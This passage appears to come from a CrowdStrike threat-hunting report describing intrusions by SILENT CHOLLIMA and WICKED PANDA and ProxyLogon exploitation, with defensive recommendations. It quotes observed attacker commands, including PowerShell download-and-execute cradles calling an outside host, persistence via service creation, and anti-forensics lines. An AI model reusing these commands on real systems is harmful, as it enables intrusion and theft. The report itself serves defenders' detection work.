In the past year, CrowdStrike Intelligence has linked SILENT CHOLLIMA\nto several intrusions targeting the pharmaceuticals industry and suspects these\nintrusions were possibly in support of efforts by DPRK to produce counterfeit\npharmaceuticals.\n\n\n###### CrowdStrike Intelligence linked SILENT CHOLLIMA to several intrusions targeting the pharmaceuticals industry and suspects these intrusions were possibly in support of efforts by DPRK to produce counterfeit pharmaceuticals.\n\n\nThe routine investigation of a burst of unusual reconnaissance activity led\nOverWatch to track down and disrupt the adversary as they attempted to deploy\nmalicious tooling within the victim environment.\n\nThe intrusion originated from a host within the victim environment that was not\ncovered by the Falcon sensor. As the sensor was progressively deployed across\nthe victim network, the full scope of this intrusion was laid bare. CrowdStrike\nIntelligence's analysis of several pieces of custom tooling seen over the course\nof this activity supported a high confidence attribution of this intrusion to SILENT\nCHOLLIMA.\n\n\n###### INITIAL ACCESS EXECUTION PERSISTENCE\n\n\n###### COMMAND & CONTROL\n\nPowerShell\nrequests were\nused to perform\nC2 communication\nover HTTP\n\n\nThe adversary\naccessed an\ninternal host via a\nlocal account\n\n\nThe adversary\nused the Smbexec\nutility to perform\nextensive\nreconnaissance\nand execute\n_GifStealer and_\n_Valefor malware_\n\n\nThe adversary\ncreated a\nWindows service\nto execute\nmalware code\nupon system\nreboot\n\n\n###### DEFENSE EVASION\n\nThe adversary\nstored binaries\nwithin legitimate\nWindows\ndirectories and\noverwrote malicious\ncode following\nexecution\n\n\n38 Check out the CrowdStrike Adversary Universe to learn more about SILENT CHOLLIMA.\n\n\n-----\n\n###### Quick-thinking Hunters Sound the Alarm on Suspicious SMB Activity\n\nOverWatch uncovered a burst of suspicious reconnaissance activity under a Windows\nservice account. Hunters recognized the format of this activity as being consistent\nwith the use of the Smbexec tool.\n\nOriginally designed as a penetration testing tool, Smbexec enables covert execution\nby creating a Windows service that is then used to redirect a command shell\noperation to a remote location over Server Message Block (SMB) protocol. Once the\noperation has been performed, the result is transferred back to the source via SMB\nand the service is deleted.\n\nThe benefit of this approach is that the adversary can perform command execution\nunder a semi-interactive shell and run commands remotely via a Windows service,\nwhich is less likely to arouse defenders’ suspicions or trigger automated detections.\nFurther, because the data transfer is performed entirely over SMB, it does not leave\nany remote procedure call (RPC) indicators.\n\nThe following command shows the Smbexec request that OverWatch threat hunters\nsaw. In near real time, hunters accurately distinguished this command from otherwise\nbenign SMB activity. The request echoes a malicious script into a separate batch\nfile before being executed and deleted. It is run via a Windows service and executed\nwithin the C$ administrative share,[39] with the result being returned via SMB.\n\nC:\\Windows\\system32\\cmd.exe /Q /c echo cmd /c\n\nC:\\Windows\\Temp\\[REDACTED].bat ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 >\n\nC:\\Windows\\TEMP\\execute.bat & C:\\Windows\\system32\\cmd.exe /Q /c\n\nC:\\Windows\\TEMP\\execute.bat & del C:\\Windows\\TEMP\\execute.bat\n\nThe adversary used this technique to execute multiple scripts and commands to\nperform reconnaissance in the victim environment. The contents of one of the\nattacker’s scripts is shown below — this was an attempt to perform Active Directory\nhost enumeration via PowerShell.[40]\n\npowershell -exec bypass -command \"Get-ADComputer\n-Filter * -Properties ipv4Address, OperatingSystem,\nOperatingSystemServicePack | Format-List name, ipv4*, oper*\"\n\nOverWatch notified the victim organization and continued to follow the adversary’s trail.\n\n39 https://attack.mitre.org/techniques/T1021/002/\n40 https://attack.mitre.org/techniques/T1059/001/\n\n\n-----\n\n###### SILENT CHOLLIMA Unleashes a Barrage of  Custom Tooling\n\nAs OverWatch continued to investigate the reconnaissance activity, the adversary\nused Smbexec to remotely copy low-prevalence executables to disk and execute\nthem. Collaboration between OverWatch and CrowdStrike Intelligence led to a quick\ndetermination that the files were an updated variant of Export Control, a malware\ndropper uniquely tied to SILENT CHOLLIMA.\n\nThis determination was made based on the behavior of the Export Control dropper,\nwhich operates by decrypting and executing shellcode that is embedded within\nthe Export Control files resources. A library function can be modified to run the\nmalicious shellcode, and in this case the modified function was _setmbcpy.\nThe shellcode is then subsequently decrypted using a custom RC4 cipher\nimplementation before it is loaded into memory and executed. In this instance,\nSILENT CHOLLIMA used this technique to load two further custom tools for\npost-compromise actions on objectives.\n\n\n-----\n\nThey started by deploying an information stealer named GifStealer, which runs a\nvariety of host and network reconnaissance commands and archives the output\nwithin individual compressed files. The header of each file is appended with “.gif”\nto appear as a Graphics Interchange Format (GIF) image and is then added into a\ncompressed archive[41] with a pseudo random name, as seen in the example below.\n\nC:\\Windows\\Temp\\~62CEH72K.tmp\n\nNext, the adversary used a separate Export Control dropper to load Valefor, a\nremote access tool (RAT) that SILENT CHOLLIMA developed for post-compromise\nactivity. Valefor uses Windows API functions and utilities to enable file transfer and\ndata collection capabilities.\n\nThreat hunters discovered the Valefor trojan using a svchost process to perform\nbeaconing and file access from a hard-coded C2 URL through PowerShell, as seen below.\n\npowershell -exec Bypass -noP \"while ($true) { $w=(New-Object\nSystem.Net.WebClient).DownloadString('[REDACTED]'); echo $w;exit}\"\n\nOverWatch continued to alert the victim organization to the developing situation and\nthe emerging attribution to SILENT CHOLLIMA.\n\n###### Increased Visibility Unearths Further Adversary Activity\n\nOverWatch worked with the victim to ascertain the full scope of adversary activity\nwithin the victim environment by expanding the rollout of the Falcon sensor.\nOverWatch increased the organization's coverage and visibility into the intrusion\nthrough this rollout, ultimately uncovering adversary activity on six additional hosts.\n\nOverWatch observed the adversary using Smbexec to remotely perform a wide\nrange of host and network reconnaissance activity from an internal host. The\nadversary again acquired an Export Control dropper to disk in preparation for\nGifStealer and Valefor installation, but this time they used a different Valefor variant,\nwhich contacted an alternative C2 infrastructure, potentially as a backup in case of\nany issues with the initial variant or C2 domain.\n\nOverWatch then discovered a service creation[42] event that was configured to\nexecute the Export Control loader every time the system reboots. Adversaries will\noften use techniques such as establishing rogue services or adding registry keys to\nmaintain persistence if they temporarily lose connection to the host.\n\nsc create [REDACTED] type= own type= interact start= auto error=\nignore binpath= \"cmd /K start C:\\Windows\\Resources\\[REDACTED].exe\"\n\nThe adversary attempted to evade detection by storing their Export Control\ndroppers and archived reconnaissance data within legitimate local directories[43] in an\neffort to masquerade the file as benign. The directories used by SILENT CHOLLIMA\nduring this intrusion are listed below.\n\nC:\\Windows\\Resources\\\n\nC:\\Windows\\Help\\\n\nC:\\Windows\\Temp\\\n\n41 https://attack.mitre.org/techniques/T1560/003/\n42 https://attack.mitre.org/techniques/T1543/003/\n43 htt // tt k it /t h i /T1036/005/\n\n\n-----\n\nThe adversary was also mindful to remove traces of the collected GifStealer\narchives by deleting them,[44] in addition to overwriting the GifStealer binary itself\nusing the string below. CrowdStrike Intelligence has also linked this technique to the\nSILENT CHOLLIMA adversary.\n\n\"C:\\Windows\\system32\\cmd.exe\" /c ping -n 3 127.0.0.1 >NUL & echo\nEEEE > \"C:\\Windows\\Temp\\[REDACTED]\"\n\nThroughout this intrusion, OverWatch threat hunters relayed their findings to the\nvictim to support their containment efforts and removal of SILENT CHOLLIMA from\nthe network. Threat hunters followed the OverWatch SEARCH methodology to its final\nstep — hone — and ensured that the new findings from the intrusion-informed hunting\nand detections logic were shared across all OverWatch customer sensors worldwide.\n\n###### Conclusion and Recommendations\n\nThe OverWatch team exposed multiple signs of malicious tradecraft in the early\nstages of this attack, ultimately leading to the identification and removal of SILENT\nCHOLLIMA from the victim’s environment. The expertise and experience of\nOverWatch hunters proved instrumental in quickly discerning malicious SMB activity\nin the victim environment. Further hunting activity uncovered a trove of custom\ntooling that aided rapid attribution efforts by CrowdStrike Intelligence.\n\nIn this instance, OverWatch worked with the victim organization to rapidly expand\nFalcon sensor coverage to the rest of its environment to support identification of\nthe adversary on additional hosts. Though the Falcon sensor can be deployed and\noperational in just seconds, OverWatch strongly recommends that defenders roll out\nendpoint protection consistently and comprehensively across their environment from\nthe start to ensure maximum coverage and visibility for threat hunters. OverWatch\nroutinely sees security blind spots become a safe haven from which adversaries can\nlaunch their intrusions.\n\nFor defenders concerned about this type of activity, OverWatch also recommends\nmonitoring service account activity and strictly limiting access to those who require it. In\nthis intrusion, SILENT CHOLLIMA was able to operate under a service account to gain\ninteractive access to various hosts. Adversaries will often use these local accounts as a\nmeans to move laterally, escalate privileges or persist within an environment.\n\nDuring this intrusion, Smbexec played a significant role in enabling SILENT\nCHOLLIMA to operate covertly, using services to relay malicious SMB commands.\nAlthough SMB is a legitimate protocol and mostly used for benign activity, it is\nessential to hunt for malicious services involving SMB. One example is to search\namong new service creation events within Windows event logs (Event ID 7045).\nIn addition, defenders should investigate instances of remote users connecting\nto administrator shares and also hunt for commands or tools that can be used to\nconnect to network shares. Finally, SMB ports 445 and 139 should not be exposed\nto the internet, a simple measure that can thwart common exploit attempts.\n\n44 https://attack.mitre.org/techniques/T1070/004/\n\n\n-----\n\n###### SILENT CHOLLIMA at a Glance\n\nThis intrusion is a timely reminder of the broad and varied missions of targeted intrusion\nadversaries operating today. Economically motivated espionage means that a broader\nrange of industries could fall victim to state-nexus intrusion activity.

OverWatch supports security teams around\nthe world by delivering context-rich alerts in near real time. These alerts\n\n#### F\n\nenable security responders to act quickly and decisively against live threats in their\nenvironment. But finding the threat is only half the battle — it is crucial that defenders\ncontain and remediate the threat quickly before any damage can be done.\n\nThe case studies that follow illustrate what can be achieved when security responders\nwork hand-in-glove with OverWatch to rapidly contain and remediate malicious\nactivity. CrowdStrike Falcon Complete™ is a comprehensive managed detection and\nresponse (MDR) service with analysts who actively monitor and manage customers’\nFalcon platform on their behalf and deliver full remediation. Falcon Complete\nleverages OverWatch threat hunting to quickly identify stealthy threat actors operating\nin customers’ environments before containing, disrupting and eradicating them.\n\n###### OverWatch Disrupts Microsoft Exchange Zero-Day Exploits With Falcon Complete\n\nIn late February 2021, OverWatch began detecting the first signs of a novel intrusion\ncampaign exploiting zero-day vulnerabilities affecting Microsoft Exchange servers.\nOverWatch identified an unknown threat actor gaining unauthorized access to\non-premises Microsoft Exchange application pools across multiple customer\nenvironments. OverWatch issued immediate alerts to affected organizations about this\nactive threat. Threat hunters then quickly teamed up with Falcon Complete to begin\ndeeper analysis and investigation into the nature of the activity.\n\nHunters initially noticed suspicious command line activity running under a parent\nprocess of w3wp.exe, which was indicative of web shell behavior. OverWatch\nflagged the activity originating from the w3wp.exe process as malicious when\nhunters observed an attempt to exploit the Exchange application pool named\nMSExchangeOWAAppPool. Falcon Complete’s subsequent analysis revealed that this\nweb shell had similarities with a China Chopper-like web shell. The below command\nwas seen across multiple organizations that were impacted by the campaign. It\nattempts to delete the administrator account from the “Exchange Organization\nadministrators” group in a likely attempt to deny legitimate administrators from being\nable to thwart their actions.\n\nCmd /c cd /d “C:\\inetpub\\wwwroot\\aspnet_client\\system_web”&net\ngroup “Exchange Organization administrators” administer /del /\ndomain& echo [S] &cd & echo [E]\n\n45 For more information see: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0688\n46 For further detail on 2020’s most commonly seen exploints, check out the 2021 CrowdStrike Global\n\nTh t R t\n\n\n-----\n\nDuring 2020, the CVE-2020-0688 vulnerability[45] impacting Microsoft Exchange\nservers was among the exploits most commonly observed by CrowdStrike.[46] Falcon\nComplete first thought that this latest activity was a resurgence of exploits against\nthis known vulnerability and began its investigation on that basis. However, analysts\nvery quickly realized that there was no forensic evidence to link this latest campaign to\nthe CVE-2020-0688 vulnerability.\n\nThrough pattern analysis of IIS web logs and Microsoft Exchange ECP Server logs, Falcon\nComplete identified a pattern of activity exploiting the Get-OabVirtualDirectory and\nthe Set-OabVirtualDirectory commands. Threat actors were using these commands\nto write an ASPX-based China Chopper-like web shell into an Offline Address Book (OAB)\nvirtual directory. The threat actors would then use that web shell for follow-on command\nexecution. This exploit chain has since been confirmed as ProxyLogon.[47]\n\nPrior to Microsoft releasing the ProxyLogon patches, Falcon Complete responded to\nand remediated all exploitation and re-exploitation incidents observed in its customers'\nenvironments. This was done via network containment, and the removal of all web shells\nand any additional adversary artifacts via remote response tools built into the Falcon\nplatform. After the release of the patches, Falcon Complete advised its customers of the\nurgent need to patch while continuing to protect their environments 24/7.\n\n###### Security Is a 24/7 Job\n\nOverWatch observed hundreds of instances of Microsoft Exchange exploitation between\nFeb. 27, 2021 and March 4, 2021. CrowdStrike observed at least six China-nexus\nadversaries attempting to conduct post-exploitation operations following successful\nexploitation. In cases where the customer was not subscribed to Falcon Complete,\nOverWatch saw some security teams struggle to deliver the round-the-clock rapid\nresponse required to manage an unpatched vulnerability. In such cases, OverWatch\ncontinued to track the activity as adversaries deployed remote access malware,\nconducted broad host and user-based reconnaissance operations, and attempted\nlateral movement, continuing to escalate the new activity to the victim organization.\n\nProxyLogon was a rare cybersecurity event: mass exploitation of Microsoft Exchange\nservers by multiple alleged state-nexus adversaries, enabled by a variety of zero-day\nexploits. The combined expertise of OverWatch and Falcon Complete helped protect\nCrowdStrike customers from these exploits prior to their public announcement. The\nexploitation of vulnerable public-facing applications and services remains a prominent\nintrusion theme, and one that shows no signs of abating as organizations across all\nverticals continue to grapple with basic security hygiene and patch management.\nOrganizations must employ strict patch management and enforce robust user and\npassword controls, coupled with robust privileged access management practices\nwhile ensuring an appropriate level of scrutiny and caution is applied for all externally\naccessible services.\n\n47 https://proxylogon.com/\n\n\n-----\n\n###### SharePoint Exploitation Becomes a Tale of  Two Outcomes\n\nIn today’s fight against globally diffuse and increasingly fast-moving cyber threats,[48]\norganizations need to be prepared to respond quickly to security events. OverWatch’s\ncontinuous hunting ensures that threats don’t go undetected whenever they strike.\nEqually important, though, is the speed of the response to those alerts to disrupt the\nadversary at the earliest possible opportunity. The next story examines the outcomes of\na rapid response, remediation and investigation by Falcon Complete that began within\njust five minutes of receiving an OverWatch alert. It goes on to explore what happened\njust a day later when the same adversary had more time to pursue their actions on\nobjectives at a different organization that was not a Falcon Complete customer.\n\nIn the second half of 2020, OverWatch found evidence of an active intrusion by WICKED\nPANDA against a Falcon Complete customer in the professional services industry. WICKED\nPANDA had exploited a multi-tenant IIS web server and used the below PowerShell\ncommand to download and execute a malicious payload under the IIS worker process.\n\npowershell -w hidden -ep bypass -c IEX(new-object\nSystem.Net.WebClient).DownloadString('https[:]//msettings[.]\ndnset[.]com/.dod/rund.txt')\n\nFalcon Complete responded within five minutes of OverWatch’s alert on the initial activity,\nquickly contained the host in accordance with the agreed standard operating procedures\nand recovered valuable artifacts to support a deeper investigation. Initial analysis of the\naffected host revealed that it was a SharePoint 2013 server. Falcon Complete was also able\nto pinpoint which of the customer’s websites had been exploited.\n\nFalcon Complete recovered a copy of rund.txt, a PowerShell script that WICKED PANDA\nhad used to download a next-stage loader executable and a Cobalt Strike Beacon payload.\nThese artifacts had been dropped into the directory C:\\Windows\\Temp with the names\nSystem.Web.Services.dll and System.Web.Services.tlb, respectively.\n\nAnalysis of rund.txt found that prior to downloading the payload, the script checked\nthe version of the .NET framework installed on the compromised host and downloaded\nthe corresponding payload. The script then executed the downloaded DLL using the\nnative Windows utility InstallUtil.exe.[49]\n\nInstallUtil.exe /logfile= /LogToConsole=false /U\nC:\\Windows\\Temp\\System.Web.Services.dll\n\nFalcon Complete traced the activity to the IIS logs and determined the activity was\nexploiting the well-known SharePoint remote code execution (RCE) vulnerability\nCVE-2019-0604.[50] One of the remnants specific to this exploit is the below call to\nthis ASPX page.\n\nPOST /_layouts/15/Picker.aspx\nPickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,\nMicrosoft.SharePoint,+Version=15.0.0.0,+Culture=neutral,+PublicKey\nToken=[REDACTED] 443 - [REDACTED]\nMozilla/5.0(Windows+NT+10.0;+Win64;+x64;+rv:70.0)+Gecko/20100101+\nFirefox/70.0 - 200 0 0 2578\n\n48 Measured by adversary breakout time, as described in this OverWatch blog.\n49 https://lolbas-project.github.io/lolbas/Binaries/Installutil/\n50 htt // l it db / l it /48053\n\n\n-----\n\nWorking in tandem, OverWatch and Falcon Complete stopped this intrusion in its tracks\nand prevented WICKED PANDA from gaining a foothold in the environment. Falcon\nComplete began responding within 5 minutes, fully triaged and remediated the host within\n1.5 hrs, and the customer began patching within 5 hours of the OverWatch alert.\n\n\n\n###### [MIN]\n## 5\n\n\nFalcon Complete acknowledged\nfirst detection and began response\n\nFalcon Complete fully triaged\nand remediated the host\n\n###### HRS\n\n## 1.5\n\nThe customer\nbegan patching\n\n###### HRS\n\n## 5\n\n\n###### Examining the Counterfactual\n\nJust one day later, OverWatch uncovered WICKED PANDA attempting the same\nactivity at another victim organization. This time, the actor executed a PowerShell\ncommand that included the distinctive command alias “kaspersky” as shown below.\n\npowershell set-alias -name kaspersky -value\nInvoke-Expression;kaspersky(NewObject Net.WebClient).\nDownloadString('https[:]//msettings.dnset[.]com/.dod/rund.txt')\n\nOverWatch hunters notified the victim organization and then continued to track the\nactor as they performed reconnaissance on the host and the Active Directory domain.\nThe actor proceeded to check the ARP cache for recent network communications\nand then opened network connections to several hosts on port 137. The actor then\nwrote a malicious DLL to disk and attempted to execute it. Finally, the actor killed the\nprocess they were executing under and deleted the malicious DLL from disk.\nWICKED PANDA later returned to drop a malicious .NET executable, identified as\nWICKED PANDA’s AttachLoader, to load an encrypted Cobalt Strike payload into\nmemory. WICKED PANDA then used PowerShell for additional discovery activity,\nenumerating running tasks, before subsequently attempting to exfiltrate this\ninformation via DNS.\n\nFor these customers, OverWatch still has their back, continuously relaying detailed\ninsights on all discovered adversary activity so that the customer can undertake a\ncomprehensive response. However, leaning on a team of expert responders to deal\nwith threat hunting discoveries can be a significant force multiplier. These examples\nshow the power of leveraging Falcon Complete’s expertise and timely response to\ntake full advantage of OverWatch’s unrivaled ability to uncover adversary activity,\nstopping intrusions on behalf of customers before the adversary can gain a foothold.\n\n\n-----\n\nne year ago, OverWatch reported on mounting cyber threats facing\norganizations as they raced to adopt work-from-home practices and\nadapt to constraints imposed by the rapidly escalating COVID-19 crisis.\n\n#### O\n\nUnfortunately, the 12 months that followed offered little in the way of reprieve\nfor defenders. The past year was marked by some of the most significant and\nwidespread cyberattacks the world has experienced.\n\nOverWatch saw interactive intrusion activity continue at record levels. Both eCrime\nand targeted intrusion adversaries continued to evolve and mature their tradecraft,\nfinding new ways to ensnare their victims.\n\nThe threat of eCrime still looms large, and adversaries have been seen exploiting\nmany avenues to gain access to victim environments — whether directly or by\nleveraging access brokers. In addition, once they gain access, eCrime adversaries\nare proving to be adept at quickly moving through victim networks, as evidenced by\nshort breakout times. (In more than a third of cases where OverWatch saw eCrime\nadversaries break out, they were able to move laterally in under 30 minutes.)\n\nTargeted intrusion adversaries are also showing no signs of slowing. The\ntelecommunications industry in particular has been hard hit, seeing intrusion\nattempts more than double and accounting for 40% of all targeted intrusion activity\nthat OverWatch observed. The mass exploitation of Microsoft Exchange server\nvulnerabilities also stood out as a low point, and as a timely reminder of both the\ncapabilities state-nexus adversaries have at their disposal and the ever-present threat\nof new vulnerabilities being found and exploited.\n\nAmidst all this, OverWatch remains vigilant, providing its customers with the\naround-the-clock coverage needed to weather the ups and downs of the past\n12 months and into the future. The defensive recommendations that follow draw on\nthe insights gleaned from threat hunters going head-to-head with adversaries every\nday of the past year.\n\n###### Recommendations\n\n\u0007Roll it out. OverWatch is seeing adversaries become increasingly adept at identifying\nthe blind spots in organizations’ security coverage. It is crucial that full endpoint\nprotection including NGAV and EDR is deployed across all endpoints. A significant\nnumber of intrusion attempts observed by OverWatch originate from hosts without\nFalcon sensor coverage, giving adversaries an opportunity to operate in the shadows.\nProtecting your most valuable assets requires visibility across all of your assets.\n\n**\u0007Turn it on. It is crucial to have comprehensive security countermeasures and to**\nenable the prevention capabilities in the products you use. If security solutions are\nin place, but not configured to provide the proper level of protection, you’re giving\nthe adversary a head start.\n\n**\u0007Be vigilant and ready to act. Adversaries are continuing to find new ways to**\nbreach organizations and can move laterally in just minutes. Defenders must\nhunt around-the-clock and must be ready to act within minutes. Top-quality\nmanaged services such as OverWatch and Falcon Complete provide the expertise,\nresources and coverage to augment your existing team.\n\n\n-----\n\n\u0007Practice good hygiene. As a baseline, your organization should establish control\nover the software running in your environment and eliminate unneeded software.\nIt is also crucial to ensure that your environment is kept up-to-date with the latest\npatches.\n\n\u0007Protect your identity. Valid accounts provide adversaries with access that is\neasy to use and difficult to discern from legitimate activity. The best defense\nis to stop valid credentials from falling into the wrong hands in the first place.\nOrganizations should avoid the use of default accounts and establish and\nenforce strong password policies, including the use of multifactor authentication.\nIt is also important not to store sensitive or credential-related information in\nunencrypted files. To mitigate against the impacts of adversaries’ use of valid\naccounts, defenders should employ the principle of least privilege and routinely\nmonitor authentication logs, account creation and changes in user privileges.\n\n**\u0007Pay close attention to remote access. The use of legitimate, non-native remote**\naccess tools such as TeamViewer, AnyDesk or VNC (and its variants) by eCrime\nactors is common. Defenders should restrict and audit the use of such tools in\ntheir environment, even for authorized use cases. Many common exploit attempts\ncan be prevented by not exposing SMB and RDP ports to the internet. Any\nexternally accessible services should be closely monitored.\n\n\n-----\n\n###### About CrowdStrike\n\nCrowdStrike, a global cybersecurity leader, is redefining security for the cloud era\nwith an endpoint and workload protection platform built from the ground up to stop\nbreaches.
